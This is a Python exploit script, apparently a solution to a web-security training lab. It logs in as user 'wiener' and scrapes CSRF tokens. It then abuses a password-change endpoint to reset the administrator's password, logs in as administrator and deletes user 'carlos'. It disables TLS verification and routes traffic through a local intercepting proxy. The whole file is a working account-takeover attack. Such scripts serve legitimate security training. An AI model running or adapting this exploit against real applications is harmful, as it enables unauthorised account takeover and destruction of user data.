import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    soup = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = soup.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_wiener_login_sucessful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url,
        session)
    data_login = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"}
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

def is_password_change_successful(url, session):
    change_password_url = (
        url + "/my-account/change-password")
    csrf_token = get_csrf_token(
        url + "/my-account",
        session)
    data_change_password = {
        "csrf": csrf_token,
        "username": "administrator",
        "new-password-1": "test",
        "new-password-2": "test"}
    response = session.post(
        change_password_url,
        data=data_change_password,
        verify=False,
        proxies=proxies)
    return "Password changed successfully" in response.text

def is_administrator_login_successful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url,
        session)
    data_login = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": "test"}
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

def is_delete_carlos_successful(url, session):
    delete_carlos_url = (
        url + "/admin/delete?username=carlos")
    response = session.get(
        delete_carlos_url,
        verify=False,
        proxies=proxies)
    return "Congratulations" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Business Logic attack...")
        if not is_wiener_login_sucessful(url, session):
            print("[-] Wiener Login Failed.")
            sys.exit(FAIL)
        if not is_password_change_successful(url, session):
            print("[-] Password change failed.")
            sys.exit(FAIL)
        if not is_administrator_login_successful(url, session):
            print("[-] Administrator login failed.")
            sys.exit(FAIL)
        if not is_delete_carlos_successful(url, session):
            print("[-] Carlos deletion failed.")
            sys.exit(FAIL)
        print("[+] The Business Logic attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The Business Logic attack was not successful.")
        sys.exit(FAIL) 